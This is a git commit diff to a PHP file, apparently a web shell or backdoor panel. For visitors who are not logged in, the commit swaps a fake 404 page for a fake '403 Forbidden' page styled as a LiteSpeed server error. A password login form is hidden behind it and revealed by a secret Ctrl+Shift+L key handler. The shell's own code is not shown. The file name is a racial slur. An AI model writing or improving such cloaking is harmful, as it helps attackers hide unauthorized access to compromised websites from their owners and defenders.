e6e1a1aab3a529c468fca9272bf797d9b6f2630b
Pix <jonathanbebtoto@gmail.com>
2026-01-31 12:59:11 +0700

    Update negros.php

--- negros.php
+++ negros.php
@@ -50,9 +50,10 @@ if (is_logged_in()) {
 } else {
     ?>
     <!DOCTYPE html>
-    <html>
-    <head>
-        <title>Error 404</title>
+<html style="height:100%">
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+<title>403 Forbidden</title>
         <script>
             document.addEventListener('keydown', function(event) {
                 if (event.ctrlKey && event.shiftKey && event.code === 'KeyL') {
@@ -61,10 +62,29 @@ if (is_logged_in()) {
             });
         </script>
         <style>
+@media (prefers-color-scheme:dark){
+  body{background-color:#000!important}
+}
+</style>
+        <style>
             #login-form { display: none; }
         </style>
         
     </head>
+    <body style="color:#444;margin:0;font:normal 14px/20px Arial,Helvetica,sans-serif;height:100%;background-color:#fff;">
+<div style="height:auto;min-height:100%;">
+  <div style="text-align:center;width:800px;margin-left:-400px;position:absolute;top:30%;left:50%;">
+    <h1 style="margin:0;font-size:150px;line-height:150px;font-weight:bold;">403</h1>
+    <h2 style="margin-top:20px;font-size:30px;">Forbidden</h2>
+    <p>Access to this resource on the server is denied!</p>
+  </div>
+</div>
+
+<div style="color:#f0f0f0;font-size:12px;margin:auto;padding:0 30px;position:relative;clear:both;height:100px;margin-top:-101px;background-color:#474747;border-top:1px solid rgba(0,0,0,.15);box-shadow:0 1px 0 rgba(255,255,255,.3) inset;">
+<br>
+Proudly powered by LiteSpeed Web Server
+<p>Please be advised that LiteSpeed Technologies Inc. is not a web hosting company and, as such, has no control over content found on this site.</p>
+</div>
     <body>
         <form id="login-form" method="POST" action="">
             <label for="password">Password:</label>
